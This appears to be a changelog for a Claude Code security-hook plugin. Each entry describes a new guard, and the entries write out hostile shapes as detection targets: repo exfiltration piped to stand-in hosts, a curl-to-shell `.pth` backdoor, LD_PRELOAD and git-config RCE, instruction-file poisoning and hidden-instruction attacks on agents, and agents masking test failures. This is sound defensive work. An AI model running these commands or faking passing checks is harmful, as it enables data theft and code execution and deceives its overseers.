Also closed two SessionStart hooks that ignored the kill-switch entirely (`config-scan`, `project-config` — both now source lib-suppress and go silent when off). +4 regression tests incl. an end-to-end check that a `CLAUDE_PLUGIN_DATA`-context hook early-exits after `off`. No hook-count change. Full suite 2334→**2338**/0.

- [2.23.36] - 2026-07-28 — perf(dx): **fold three Post:Write advisory hooks into one dispatcher (~18ms/Write saved).** `conflict-marker-guard`, `config-validity-guard`, and `shebang-exec-guard` (all v2.23.32–.35, all PostToolUse:Write WARN) each spawned a separate process paying the ~9ms per-hook floor, so a single Write ran three — ~27ms of stacked overhead on the common (benign) path. They're now one `post-write-advisor` hook backed by a shared `lib_postwrite.py` that reads the final on-disk file **once** and runs all three checks: a benign write costs **one** spawn (measured 8.4ms) instead of three (~27ms). **Behaviour is unchanged** — identical detection logic (merge-conflict markers, unparseable json/yaml/toml with JSONC-lenient retry, shebang-without-+x), and each check still honours its **original** kill-switch (`SUPERCHARGER_CONFLICT_MARKER_GUARD` / `_CONFIG_VALIDITY_GUARD` / `_SHEBANG_EXEC_GUARD`) plus a new master `SUPERCHARGER_POST_WRITE_ADVISOR=0`; multiple findings on one file now combine into a single advisory. The three standalone hooks + their test files are removed. Full-mode hook count 139→**137** (−3 +1). Net −21 tests (folded into one 13-case dispatcher suite that also covers the combined-advisory + per-check kill-switch paths). Attacks the per-hook floor from [[perf-hook-overhead]]; the Pre:Write `ansi-escape-guard` and older `phantom-import-guard` are left standalone. (Also: version bump now covers the plugin manifest, enforced by the new `test-version-parity`.)

- [2.23.35] - 2026-07-27 — feat(dx): **new `shebang-exec-guard` — flag a script written without its executable bit.** The Write tool creates files at mode 0644, so a freshly-written `#!/usr/bin/env bash` script isn't executable — `./deploy.sh` then fails with "permission denied", a wasted round-trip (the exact recurring pain behind the project's own "chmod +x new hooks" rule). The new PostToolUse hook (matcher `Write,Edit,MultiEdit`, full-mode, `/profile`-gated, async) reads the **final on-disk mode** and **warns** (additionalContext, never blocks) with the exact `chmod +x <path>` when the file begins with a shebang but lacks any execute bit. WARN, not ASK — many shebang files are meant to be *sourced*, so it's a heads-up, not a gate; a file already `+x`, one with no shebang, or a shebang not on line 1 stays silent. Fail-open; disable with `SUPERCHARGER_SHEBANG_EXEC_GUARD=0`. Full-mode hook count 138→**139**. +9 tests. Full suite 2351/0. (Rank-5c — this completes the 2026-07-27 merged research sweep: 7 releases, v2.23.29–.35.)

- [2.23.34] - 2026-07-27 — feat(coverage): **new `ansi-escape-guard` — block a hidden-payload ANSI escape written into a file.** A RAW ANSI escape in a source file can carry a concealed payload: the SGR conceal code (`ESC[8m … ESC[0m`) renders text invisible to a human but fully readable by the model / next reviewer (a hidden-instruction trap), and OSC-8 (`ESC]8;;`) masks a link's real target — 2026 Codex-CLI ANSI-injection RCE and the macOS Terminal DiLLMa DNS-exfil class. The prompt-injection scanner reads Bash *output* for this, but nothing guarded an agent *writing* an escape-laden file. The new PreToolUse hook (matcher `Write,Edit,MultiEdit`, full-mode, `/profile`-gated) **asks** when written content contains a **raw ESC byte** forming a conceal or OSC-8 sequence. Key FP control: a raw ESC in source is itself the anomaly — a normal string constant uses the **textual** `\x1b`, which does NOT fire, so terminal libraries defining escape constants are unaffected; plain SGR **color** (`ESC[31m`) is likewise ignored (only content-HIDING codes count). Terminal-recording / snapshot fixtures (`.cast`/`.ansi`/`.snap`/`.vhs`/`__snapshots__`/`fixtures/`) and docs (`.md`/`.rst`/`.txt`) are skipped. Asks once per file per session. Fail-open; disable with `SUPERCHARGER_ANSI_ESCAPE_GUARD=0`. Full-mode hook count 137→**138**. +11 tests. Full suite 2341/0. (Rank-5b of the 2026-07-27 merged research sweep.)

- [2.23.33] - 2026-07-27 — feat(dx): **new `config-validity-guard` — warn when a written `.json`/`.yaml`/`.toml` no longer parses.** A stray trailing comma or unbalanced brace from a bad Edit to `package.json` / `tsconfig.json` / a CI workflow / `pyproject.toml` looks fine but blows up a round-trip later at `npm install` / `tsc` / CI. The new PostToolUse hook (matcher `Write,Edit,MultiEdit`, full-mode, `/profile`-gated, async) parses the **final on-disk file** (post-write, since an Edit's `new_string` is only a fragment) and **warns** (additionalContext, never blocks) when it doesn't parse. JSON that fails strict parse is retried **leniently** (comments + trailing commas stripped) so JSONC — `tsconfig.json`, `.vscode/*.json` — passes and only a genuinely broken file warns; `//` inside a string (`http://…`) is protected. YAML and TOML are validated only when their parser is importable (`pyyaml` / `tomllib` 3.11+), else skipped — fail-open, never a false warning from a missing parser. Empty/missing files are skipped. Full-mode hook count 136→**137**. +12 tests. Full suite 2329/0. (Rank-5a of the 2026-07-27 merged research sweep.)

- [2.23.32] - 2026-07-27 — feat(dx): **new `conflict-marker-guard` — catch a merge-conflict marker left in a written file.** When an agent half-resolves a merge conflict (or writes one as content) and leaves a `<<<<<<< HEAD` / `=======` / `>>>>>>> branch` marker behind, the file no longer compiles/parses — but the failure only surfaces a round-trip later at build/run. No hook detected this (verified — grep across `hooks/` found none). The new PostToolUse hook (matcher `Write,Edit,MultiEdit`, full-mode, `/profile`-gated, async) **warns** (additionalContext, never blocks) when written content contains a **line-anchored** 7-char angle marker (`<<<<<<< ` / `>>>>>>> `) — so heredocs (`<<EOF`), bit-shift (`>>`), and 6-char runs don't trip; a bare `=======` line is reported only alongside an angle marker (it doubles as a text separator/underline). Documentation and patch files (`.md`/`.mdx`/`.rst`/`.txt`/`.adoc`/`.org`/`.eml`/`.patch`/`.diff`/`.rej`) are skipped — markers there are usually illustrative or 7-deep email quotes — keeping false positives near zero. Fail-open; disable with `SUPERCHARGER_CONFLICT_MARKER_GUARD=0`. Full-mode hook count 135→**136**. +13 tests. Full suite 2316/0. (Rank-4 of the 2026-07-27 merged research sweep.)

- [2.23.31] - 2026-07-27 — feat(coverage): **new `editor-config-guard` — the `.claude/settings.json` auto-run primitive, ported to sibling editor configs.** The hook/MCP auto-execute vector was guarded only for `.claude/settings.json` + root `.mcp.json`; the identical primitive in neighbouring AI/editor configs was wide open — `config-scan` inspects only Claude's own files (verified). 2026 malware (Contagious Interview's `tasks.json` vector, Miasma / Mini-Shai-Hulud worms; MCPoison CVE-2025-54136, Windsurf CVE-2026-30615) writes self-running code into: `.vscode/tasks.json` / `*.code-workspace` with `runOptions.runOn: "folderOpen"` (silent exec on next open), and `.vscode/mcp.json` / `.cursor/mcp.json` / `.gemini/settings.json` defining a stdio server (`"command": …` launches a local process on load). The new PreToolUse hook (matcher `Write,Edit,MultiEdit`, full-mode, `/profile`-gated) **asks** before such a write, gated on the auto-RUN keys (`folderOpen` / a stdio `command`) so a plain build-task or a **remote-only** (`url`) MCP config passes — low FP. `.cursor/rules/*.mdc` is deliberately NOT covered here (that's prose instruction-poisoning, already handled by `memory-write-guard` v2.23.23); this guards the code-that-runs configs, distinct from harness-tamper's inline `--mcp-config` Bash flag. Asks once per file per session. Fail-open; disable with `SUPERCHARGER_EDITOR_CONFIG_GUARD=0`. Full-mode hook count 134→**135**. +14 tests. Full suite 2302/0. (Rank-3 of the 2026-07-27 merged research sweep.)

- [2.23.30] - 2026-07-27 — feat(dx): **`redirect-clobber-guard` → `cp`/`mv` overwriting a tracked file (sibling-verb parity gap).** The clobber detector guarded `>`/`sed -i`/`tee`/`dd of=`/`truncate` overwriting a git-tracked source, but its `cp`/`mv` siblings had drifted — `safety.sh` covers `cp`/`mv` only for *security* targets (sudoers/authorized_keys/shell-profiles/cron), so a plain `mv build/app.js src/app.js` or `cp template.ts config.ts` silently overwriting a tracked source bypassed **every** write guard (no read-before-write, no path-guard). A textbook [[cross-channel-parity-drift]]. `redirect-clobber-detect.py` now parses the `cp`/`mv` **destination** (the trailing operand, or the `-t DIR`/`--target-directory` target → `DIR/basename(src)`) and — reusing the exact same git-tracked-only downstream check — **asks** once per (dest, session) when it overwrites a tracked file. Deliberately narrow to hold FP near zero: recursive/archive copies (`-r`/`-R`/`-a`) are skipped (dir semantics, parse-ambiguous), a pure **rename to a NEW path** stays silent (only a *tracked* dest is ever surfaced), destinations under generated dirs (`dist/`/`build/`/…) are excluded, and `scp`/`cmp`/other `*cp*` words don't match (word-anchored `(cp|mv)`). No new hook, no count change. +10 tests. Full suite 2287/0. (Rank-2 of the 2026-07-27 merged research sweep.)

- [2.23.29] - 2026-07-27 — feat(coverage): **`git-config-exec-guard` → the `ext::`/`fd::` remote-helper transport (fresh RCE class).** The `ext::` (and `fd::`) git remote transport makes git run an **arbitrary shell command** at clone/fetch/remote-add time — no config key, no hooks, no submodule — and `-c protocol.ext.allow=always` re-enables the transport git disabled by default. Revived in 2026 by simple-git **CVE-2026-28292** (CVSS 9.8) and n8n **CVE-2026-25053**, both injecting `protocol.ext.allow=always` + an `ext::` URL. The existing git guards covered only persistent *config-key* exec gadgets (`fsmonitor`/`hooksPath`/`sshCommand`/`filter`/`insteadOf`) — the transport-helper path was unguarded (verified). Folded into `git-config-exec-guard` (same PreToolUse:Bash matcher, same DENY path — thesis: extend, don't duplicate): it now **denies** an `ext::`/`fd::` token that *starts a transport argument* (matched only after start/space/quote/`=`, so a path or URL that merely contains `ext::` — `https://ex.com/ext::x`, `context::main` — does **not** fire; near-zero FP) and `protocol.(ext|file).allow=always`. `ext::`/`fd::` transports are essentially never legitimate in agent-driven work → DENY. No new hook, no count change. +7 tests. Full suite 2277/0. (Rank-1 of the fresh 2026-07-27 merged research sweep.)

- [2.23.28] - 2026-07-27 — feat(dx): **new `phantom-import-guard` — catch a hallucinated local import before it fails to compile.** When Claude writes a relative import to a local module that doesn't exist — a hallucinated filename or wrong relative depth (`import { send } from './services/email'` when the file is `./services/mailer.ts`; Python `from .ghost import x`) — the error only surfaces at the next compile/run, a wasted round-trip later. The new PostToolUse hook (matcher `Write,Edit,MultiEdit`, full-mode, `/profile`-gated, async) resolves each newly-written **`./` or `../`** relative import against the filesystem — trying every real extension (`.ts`/`.tsx`/`.js`/`.jsx`/`.mjs`/`.cjs`/`.json`), directory `index.*`, and Python `module.py`/`package/__init__.py` — and **warns** (additionalContext, never blocks) only when **nothing** resolves. Deliberately scoped: path aliases (`@/…`), bare packages (`react`), and stdlib imports are skipped (they need a resolver, not the filesystem), so false positives stay low; barrel `index` files and real modules resolve silently. Fail-open; disable with `SUPERCHARGER_PHANTOM_IMPORT_GUARD=0`. Full-mode hook count 133→**134**. +14 tests. Full suite 2270/0. **This exhausts the entire 2026-07-26 research slate — Tier-1 (5) + Tier-2 (5) + Tier-3 (2), all shipped.**

- [2.23.27] - 2026-07-27 — feat(dx): **new `generated-file-guard` — stop editing generated output instead of source.** Hand-editing a generated/derived file is wasted work: the change is silently wiped on the next codegen/build (graphql-codegen, protoc, tsc `--declaration`, a bundler), producing a confusing "my fix disappeared" loop. The new PreToolUse hook (matcher `Write,Edit,MultiEdit`, full-mode, `/profile`-gated) **asks** before a write to a file that either (a) declares itself generated via a header — `@generated`, `DO NOT EDIT`, `Code generated by`, `automatically generated`, `@codegen` (near-zero FP: the file literally says so; read from the on-disk file) — or (b) sits in a generated location/type: `dist/`, `build/`, `__generated__/`, `*_pb2.py`/`*_pb2_grpc.py`, `*.pb.go`/`*.pb.gw.go`, `*.g.dart`, `*.gen.go`, `*.generated.*`, `*.min.js`/`*.min.css`. Conservative by design — hand-authored near-misses pass (`build.gradle`, `types/global.d.ts`, `distribution.py`), and `.d.ts` was deliberately excluded (commonly hand-written ambient types). Asks once per file per session and points at the source to edit instead. Advisory + fail-open; disable with `SUPERCHARGER_GENERATED_FILE_GUARD=0`. Full-mode hook count 132→**133**. +17 tests. Full suite 2255/0. (Tier-3 of the 2026-07-26 slate.)

- [2.23.26] - 2026-07-27 — feat(hardening): **three Tier-2 fold-ins — completes the 2026-07-26 research slate (10/10).** No new hooks (extends three existing ones), no count change. (1) **TLS-disable patterns** added to `lib_code_patterns.py` (shared by the write-time `code-security-scanner` and the commit-boundary scan): `rejectUnauthorized: false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, Python `verify=False`, Go `InsecureSkipVerify: true`, PHP/libcurl `CURLOPT_SSL_VERIFYPEER/HOST` disabled, and Python `ssl._create_unverified_context`/`CERT_NONE` — all MITM-enabling insecure-transport idioms (benign `verify=True` unaffected). (2) **`install-script-guard` → `binding.gyp`/`.gyp`/`.gypi`**: node-gyp executes a `binding.gyp` during `npm install`'s config phase (before pre/postinstall), so a weaponized `"action"` block or a `<!(cmd)` command-expansion runs arbitrary shell then — now **asks** on an added action/command-expansion/network token (a plain compile-only `binding.gyp` passes). (3) **`harness-tamper-guard` inline-config smuggling**: passing **inline `--settings`/`--mcp-config` JSON** to `claude` defines hooks / MCP servers (code execution) on a sub-instance *without writing a file*, bypassing path-guard's settings.json/.mcp.json write guards — now **denied** when the value is inline JSON (a plain `--settings ./file.json` path is left alone), plus the newly-added `--allow-dangerously-skip-permissions` variant. (The slate's `--prefill` was dropped — verified it is not a current Claude Code flag.) +33 tests (6 TLS + 5 gyp + 6 harness-tamper + adjustments). Full suite 2237/0.

- [2.23.25] - 2026-07-26 — feat(coverage): **new `pth-persistence-guard` — blocks the `.pth` startup-exec backdoor.** CPython executes any line in a `.pth` file that starts with `import ` — on **every interpreter startup**, with no explicit import, for any `.pth` dropped in `site-packages`/`dist-packages`. A code-bearing `.pth` (`import os;os.system('curl|sh')`) is therefore a persistence/RCE primitive that **survives package uninstall** (the "Hades" `.pth`-worm class, 2026). `install-script-guard` covers `package.json`/`setup.py` lifecycle scripts but not `.pth` — a distinct startup channel. The new PreToolUse hook (matcher `Write,Edit,MultiEdit`, full-mode) inspects a `.pth` write's `import`-prefixed lines and **denies** ones carrying a shell/network primitive (`os.system`/`os.popen`/`subprocess`/`Popen`/`socket`/`pty`/`/dev/tcp`/`urllib`/`requests`/`curl`/`wget`/`base64.b64decode` — never a legitimate `.pth` use), and **asks** on the softer exec forms (`exec(`/`eval(`/`__import__(`/`compile(`) that can rarely appear in old setuptools editable shims. Legitimate `.pth` files — bare path lines, `import sys; sys.path.insert(...)` finders, editable-install shims, comments — pass, and a non-`.pth` file with identical content is ignored (it doesn't auto-execute). Fail-open; disable with `SUPERCHARGER_PTH_GUARD=0`. Full-mode hook count 131→**132**. +14 tests. Full suite 2220/0. **This completes all five Tier-1 items of the 2026-07-26 research slate.**

- [2.23.24] - 2026-07-26 — feat(coverage): **new `env-exec-guard` — catches code-injecting environment variables.** Setting a preload/auto-source/interpreter-hook env var causes arbitrary code execution on the **next process spawn** — the `git status` / `npm test` that runs afterward looks benign, so it sidesteps every command-pattern guard. `export LD_PRELOAD=/tmp/x.so && git log`, `NODE_OPTIONS='--require /tmp/x.js' npm test`, `export BASH_ENV=/tmp/p.sh`, `export GIT_SSH_COMMAND='sh -c …'`, `RUBYOPT=-r<lib>`, `PERL5OPT=-M<mod>`. `safety.sh` covers reverse shells / persistence files but not the env-preload exec class (verified — zero coverage). The new PreToolUse hook (matcher `Bash`, safe-mode floor, `/profile`-gated) **asks** with a per-variable value policy so benign forms pass: pure exec vectors (`LD_PRELOAD`, `DYLD_INSERT_LIBRARIES`, `BASH_ENV`, `ENV`, `PYTHONSTARTUP`) fire on any value; `NODE_OPTIONS` only on `--require`/`--import`/`-r` (so `--max-old-space-size` passes); `GIT_SSH_COMMAND`/`PROMPT_COMMAND`/`GIT_EXTERNAL_DIFF` only on a command-injection shape (so `ssh -i ~/.ssh/id` and `history -a` pass); `LD_LIBRARY_PATH`/`DYLD_LIBRARY_PATH`/`PYTHONPATH` only on a writable/tmp/relative path (so `/usr/local/lib` passes); `PERL5OPT`/`RUBYOPT` on `-M`/`-e`/`-r`. Asks once per variable per session. Fail-open; disable with `SUPERCHARGER_ENV_EXEC_GUARD=0`. Safe-mode hook count 37→**38**, full 130→**131**. +23 tests. Full suite 2205/0.

- [2.23.23] - 2026-07-26 — feat(memory-write-guard): **extend the memory-poison guard to auto-loaded INSTRUCTION files (2026 rules-poisoning class).** `memory-write-guard` already DENYs a Write/Edit to persistent-memory files whose content carries instruction-override / persona-hijack / token-injection / zero-width / credential-exfil markers. But agent-**instruction** files are auto-loaded into context at every session start exactly like memory — and a poisoned write to one turns the dev's own assistant into the exfil mechanism next session (the TrapDoor / Injective-SDK "rules-poisoning" class). `config-scan` only *reads* `CLAUDE.md` at the next SessionStart (a delayed warning); nothing guarded the **write**. The guard's file gate now also covers project `CLAUDE.md`, `.claude/**/*.md` rules, `AGENTS.md`, `GEMINI.md`, `.cursorrules`, `.cursor/rules/*.mdc`, `.clinerules`, `.windsurfrules`, and `.github/copilot-instructions.md` — reusing the exact same poison-marker + zero-width detection engine (DENY parity, near-zero FP since the markers never appear in legitimate rules). Benign instruction writes pass (a `CLAUDE.md` saying "ignore the following build dirs" is fine — the override pattern needs *instructions/directions/commands*), and poison in a **non**-auto-loaded file (README, source) is intentionally out of scope (caught on Read by `prompt-injection-scanner`). No hook-count change (extends an existing guard). +10 tests. Full suite 2181/0.

- [2.23.22] - 2026-07-26 — fix(parity): **PowerShell parity pass + setuid hardening + a latent no-op bug.** A fresh coverage-matrix audit found the surface saturated except one systematic column: `safety.sh` (the DENY-tier Bash guard) was extended to PowerShell back in v2.22.11, but its **ASK-tier sibling guards never were** (cross-channel-parity-drift). Fixed: (1) `cloud-cli-destructive-guard`, `bulk-exfil-guard`, and `harness-tamper-guard` matchers now cover **`Bash,PowerShell`** — the cloud-teardown / cloud-sync regexes are byte-identical across shells, and `--dangerously-skip-permissions` is the same string; (2) `harness-tamper-guard` gained the PowerShell file-tamper cmdlets (`Remove-Item`/`Move-Item`/`Rename-Item`/`Clear-Content`/`Set-Content`/`Out-File`) over the hook scripts; (3) `bulk-exfil-guard` gained the PowerShell archive-to-network exfil shape (`Compress-Archive | Invoke-WebRequest`, `Invoke-WebRequest/-RestMethod -Method Put/Post -InFile/-Body/-Form`); (4) **`human-approval-gate` latent bug fixed** — it was *registered* on the PowerShell channel but its command extraction read only `.tool_input.command`, so a PowerShell payload (body in `.script`/`.code`) made the gate a **silent no-op**; it now reads `.command or .script or .code` (both extraction sites). Separately, **setuid/setgid hardening**: `safety.sh` `DESTRUCT_PATTERNS` now denies `chmod 4755`/`6755`/`2755`/`+s`/`u+s`/`g+s` (privilege-escalation / persistence binaries) — only `chmod 777` was caught before; ordinary modes (`755`, `0644`, `1755` sticky, `-R 755`, `+x`) pass. No hook-count change (matcher extensions + pattern additions). +24 tests (11 PowerShell parity + 13 setuid). Full suite 2171/0.

- [2.23.21] - 2026-07-26 — feat(coverage): **new `git-config-exec-guard` — blocks the git-config → RCE family.** `git config` (or `git -c KEY=VAL`) can set an **exec-capable** key that makes the next ordinary git command run arbitrary shell: `git config core.fsmonitor '!…'` fires on the next `git status`; also `core.sshCommand`, `credential.helper`, `core.pager`/`core.editor`, `alias.x '!sh'`, `filter.*.clean/smudge`, `diff.*.command`, `difftool/mergetool.*.cmd`, `sequence.editor`, and a persistent `core.hooksPath` redirect (CVE-2026-55607 fsmonitor class + the git-credential-helper CVE cluster). `git-safety` blocked only the *inline* `-c core.hooksPath=` verification-bypass form — the whole persistent-config exec family was open. The new PreToolUse hook (matcher `Bash`, safe-mode floor, `/profile`-gated) **denies** the always-malicious subset (`core.fsmonitor`, a command-valued `core.sshCommand`) and **asks** on the rest, **value-shape-gated** so the common benign forms pass untouched (`credential.helper=cache`, `core.pager=less`, `core.editor=vim`/`code --wait`, `alias.co=checkout`, `git -c core.pager=less log`) — it only fires when the value is command-shaped (`!`-prefixed, `$()`/backtick/`;`/`|`, an `sh -c`/`node -e`/`python -c` interpreter, or a `.sh`/`.py`/… script path). Asks/denies once per key per session. Fail-open; disable with `SUPERCHARGER_GIT_CONFIG_EXEC_GUARD=0`. Safe-mode hook count 36→**37**, full 129→**130**. +23 tests. Full suite 2147/0.

- [2.23.20] - 2026-07-26 — feat(coverage): **new `test-mask-guard` — defends the Verification Gate at the command channel.** Supercharger's flagship principle is "run the check, confirm it passes," but Claude can make a failing check report green by masking the runner's **exit status** — `pytest -q || true`, `npm test || echo ok`, `make test; exit 0`, `go test ./... ; true` — after which an "it passes" claim is unfounded. `test-integrity-guard` guards test-FILE edits and `git-safety` guards `--no-verify`; the command-level exit-mask on a verification runner was the unguarded sibling (cross-channel-parity gap, surfaced by a fresh 4-angle research sweep). The new PreToolUse hook (matcher `Bash`, full-mode) **asks** when a verification runner (npm/yarn/pnpm test·run·build·lint·typecheck, jest, vitest, mocha, pytest, `go test`, `cargo test`, `make test`, tsc, eslint, ruff, mypy, rspec, phpunit, …) is combined with an exit-mask (`|| true`, `|| :`, `|| echo`, `; exit 0`, `; true`). Anchored so a mask on a **non-runner** passes (`rm foo || true`, `ls || true`, `git status; exit 0`), an **unmasked** runner passes (`npm test`, `npm test && echo done`), and pure output-suppression (`2>/dev/null` alone — doesn't mask the exit code) is **not** flagged. Asks once per command per session. Advisory + fail-open; disable with `SUPERCHARGER_TEST_MASK_GUARD=0`. Full-mode hook count 128→**129**. +24 tests. Full suite 2123/0.

- [2.23.19] - 2026-07-26 — feat(coverage): **new `bulk-exfil-guard` — catches whole-tree exfiltration that carries no sensitive filename.** `safety-detect.py`'s upload arms (`_NETWORK_UPLOADS` / `_CLOUD_UPLOADS`) only fire when the command *also* names a sensitive path (`.env`, `id_rsa`, `.aws`…), so staging the **entire repo** dodges them — `tar czf - . | curl --data-binary @- https://evil`, `zip -r - . | curl -F`, `aws s3 sync . s3://attacker`, `rsync -a . host:` — none contain a sensitive-name token, so nothing blocked them. The new PreToolUse hook (matcher `Bash`, safe-mode floor, `/profile`-gated) **asks** on the *shape* instead of a filename: (A) an archive/stream producer (`tar`/`zip`/`gzip`/`zstd`/…) piped into a network sink (`curl`/`wget`/`nc`/`ncat` — **not** `ssh`, so `tar | ssh host` backups pass), (B) a whole **cwd/root/home** synced to remote cloud storage (`aws s3 sync .`/`$HOME`, `aws s3 cp / --recursive`, `gsutil rsync -r .`, `rclone sync ~`), or (C) a recursive copy of cwd/root/home to a remote host (`rsync -a . host:`, `scp -r . host:`). Anchored so it does **not** fire on local archives (`tar czf backup.tgz .`), single-file uploads (`aws s3 cp report.pdf s3://…`), or scoped deploys (`aws s3 sync build/ s3://cdn`) — only whole cwd/root/home to a remote. ASK (bulk upload is often a legit backup/deploy), asks **once per command per session**. Advisory + fail-open; disable with `SUPERCHARGER_BULK_EXFIL_GUARD=0`. Safe-mode hook count 35→**36**, full 127→**128**. +22 tests. Full suite 2098/0.

- [2.23.18] - 2026-07-26 — feat(multi-review): **borrow `/claude-security`'s verification panel + signal filter to cut false positives.** `/multi-review` already fans out three lens-agents (security/perf/correctness) and synthesizes; it now adds, between fan-out and synthesis, an **adversarial verification pass** modelled on Anthropic's `/claude-security` panel — every MUST FIX finding is stress-tested through REACHABILITY (can attacker/caller-controlled input actually reach it?), IMPACT (what concretely breaks?), and DEFENSES (does an existing check/type/contract already neutralize it?), then marked CONFIRMED / DOWNGRADE / DROP, with single-lens findings capped at MEDIUM confidence. Each agent brief also gains a **signal filter** that suppresses the low-value classes `/claude-security` explicitly excludes (DoS/resource-exhaustion, rate-limiting, open redirects, and generic "missing input validation" with no demonstrated exploit path). The report gains a "Filtered" section so dropped/downgraded findings stay transparent. Borrows the review *methodology*, not the multi-agent orchestration harness (the command already dispatches its own reviewers). Prompt-template change only — no hooks or code. Full suite 2075/0.

- [2.23.17] - 2026-07-26 — feat(security-command): **`/security` now does diff-scoped review (uncommitted / staged / branch / PR / commit), mirroring Anthropic's `/security-review`.** Previously `/security $ARGUMENTS` only reviewed named files. Added a Step 0 scope resolver: no args → uncommitted changes (`git diff HEAD` + staged, falling back to `HEAD` on a clean tree); `staged` → staged only; a branch/base ref → `git diff <merge-base>...HEAD`; `pr <N>`/`#<N>` → `gh pr diff <N>` (read-only, stops if `gh` absent); a sha → `git show <sha>`; file/dir paths → whole-file review (unchanged). For a diff scope it reviews only the changed hunks + their enclosing functions, states the resolved scope in the header, and all git/`gh` calls are explicitly read-only (never stages/commits/modifies). The OWASP dimensions and finding format are unchanged. Prompt-template change only — no hooks or code. Full suite 2075/0.

- [2.23.16] - 2026-07-26 — feat(commit-guard): **commit-boundary code-vulnerability scan — the diff-scoped backstop to the per-write scanner.** Adopting the "scan changes" idea from Anthropic's Claude Security plugin as an *enforcement* gate (not the multi-agent orchestrator): the write-time `code-security-scanner` only sees each single Write/Edit Claude makes, so it misses vulns that emerge across several edits, in human edits, or in code that predates the hook. New **Check 4** in `commit-guard` (already gated to `git commit`) runs the staged diff's added lines through the same patterns and **asks** before the commit lands (ASK, not deny — may be intentional in a test fixture or security tool; secrets still hard-deny via Check 3). To keep the two enforcement points from drifting, the content vuln patterns (JS/Python/deserialization/SQL/hashing/obfuscation/insecure-RNG) were extracted into a shared **`lib_code_patterns.py`** — mirroring how `lib-secret-patterns.sh` centralizes secrets — and the write-time scanner now imports it too (behaviour unchanged: all 14 existing scanner tests still pass). Disable the commit scan with `SUPERCHARGER_COMMIT_CODE_SCAN=0`. Fail-open. +15 tests (6 commit-scan + 9 shared-module unit). No hook-count change (edits an existing hook + adds a lib). Full suite 2075/0.

- [2.23.15] - 2026-07-26 — feat(code-security-scanner): **broaden the real-time write scanner with patterns adopted from Anthropic's Claude Security taxonomy.** After Anthropic shipped its Claude Security plugin (multi-agent, on-demand scanner) + Security Guidance plugin (25 real-time patterns), audited our `code-security-scanner` against both lists. Deliberately did NOT adopt the multi-agent orchestration architecture (off-thesis — Supercharger is enforcement hooks, not orchestration; our `/security` + `/multi-review` are the analog) and skipped the logic-level classes (IDOR, broken-authz, SSRF-in-code, NoSQL/LDAP injection) that need semantic analysis a regex hook can't do soundly. Added the **regex-shaped, low-FP** gaps: Node command injection (`child_process.exec`/`.execSync`/`shell: true`), `os.popen()`, `yaml.load()` (unsafe deserialization → `safe_load`), cross-language deserialization (PHP `unserialize()`, Ruby `Marshal.load()`, Java `ObjectInputStream`), XSS `insertAdjacentHTML`/`.outerHTML =`, deprecated `crypto.createCipher()`, and **context-gated insecure randomness** (`Math.random()` / Python `random.*` flagged only when a token/secret/nonce/salt/csrf word is nearby, so ordinary jitter/shuffle use isn't). Secret-token prefixes (sk-ant/AKIA/ghp_/PEM/JWT) were already centralized in `lib-secret-patterns.sh` (commit/output/prompt boundaries) — not duplicated. Still advisory + fail-open. +8 tests (incl. 2 false-positive guards). Full suite 2060/0.

- [2.23.14] - 2026-07-26 — feat(coverage): **new `package-source-guard` — closes the dependency-ORIGIN supply-chain gap.** The three existing supply-chain hooks each guard a different facet — `install-script-guard` = lifecycle scripts, `lockfile-integrity-guard` = lockfile hash, `dep-vuln-scanner` = known CVEs (post-install) — but the **source a dependency is pulled from** was unguarded, and a malicious origin runs before any CVE scan ever sees it. The new PreToolUse hook (matcher `Write,Edit,MultiEdit`, full-mode, sibling of the lockfile/install-script guards) **asks** when a manifest edit adds/changes a dependency to a **non-registry source**: a tarball/wheel URL, a `git+`/`git://`/`github:owner/repo` shorthand, a `file:`/local path, or a registry-override/custom-index (`--extra-index-url`, poetry/cargo custom source, npm `overrides`/`resolutions`) — the dependency-confusion vector. Covers 7 ecosystems (`package.json`, `pyproject.toml`, `Pipfile`, `requirements*.txt`, `Gemfile`, `go.mod`, `Cargo.toml`): npm via a precise JSON dep-map diff (only added/changed deps flagged; plain `^`/`~`/exact/`workspace:` ranges pass), the rest via per-ecosystem added-line scans. Asks **once per source per session** so re-edits don't nag. Advisory + fail-open; disable with `SUPERCHARGER_PACKAGE_SOURCE_GUARD=0`. Full-mode hook count 126→**127**. +24 tests. Full suite 2052/0. (Impl note: the python heredoc is redirected to a temp file rather than captured via `$(python3 <<'PYEOF' …)` — bash 3.2's old command-substitution parser mis-scans a heredoc body this paren/quote-heavy and aborts with a bogus EOF; a non-nested heredoc parses cleanly.)

- [2.23.13] - 2026-07-26 — fix(path-guard): **stop false-blocking repo-root files when Claude is launched from a subdirectory.** `path-guard`'s project boundary was the session's cwd (`.cwd`), so when Claude Code was started from a subfolder of the repo (e.g. `radius-bundles/app`), any file at the **repo root** (`vercel.json`, `package.json`, `tsconfig.json` …) sat *above* cwd and was wrongly denied with *"absolute path outside project root"* — a recurring false positive on root-level files. `_resolve_project_root` only walks up for linked git *worktrees*, not plain subdirectories, so it didn't help. The boundary now widens to the enclosing **git repo root** — but **lazily**: `git rev-parse --show-toplevel` is resolved only when a write would *otherwise* be blocked, so the common path (writing under cwd) stays fork-free. Applied to both the `abs-path` and `symlink` "outside project" branches. In-repo writes at any depth are now allowed; truly-outside paths (`~/.ssh`, `/etc`), sibling repos, and non-git parent dirs still block (verified). +4 regression tests. Full suite 2027/0.

- [2.23.12] - 2026-07-26 — fix(handoff): **session-scope the handoff brief so concurrent sessions in one project stop clobbering each other.** `/handoff` wrote a single unsuffixed `.claude/handoff.md`, and both auto-load readers (`session-memory-inject` at SessionStart, `post-compact-inject` at compaction) read that same path — so with two+ sessions open on one project it was last-writer-wins, and one session's compaction could inject *another* session's resume brief (the `scope-file-session-scoping` leak class; note the sibling crash-checkpoints were already `.checkpoint-<sid>`-scoped — handoff was the odd one out). Now `/handoff` writes `.claude/handoff-<session_id>.md` (session id from the `CLAUDE_CODE_SESSION_ID` env var, verified equal to the `session_id` hooks read from stdin), and a **single shared selector** `lib-handoff.sh` — sourced by all three readers so they can't drift — picks **this session's own brief first, else the newest recent one, else the legacy unsuffixed file**, all 7-day gated (compaction uses no age gate since it's same-session). Backward compatible: a pre-existing `.claude/handoff.md` is still read as the final fallback. +9 selector unit tests + integration smoke on both readers. Full suite 2023/0.

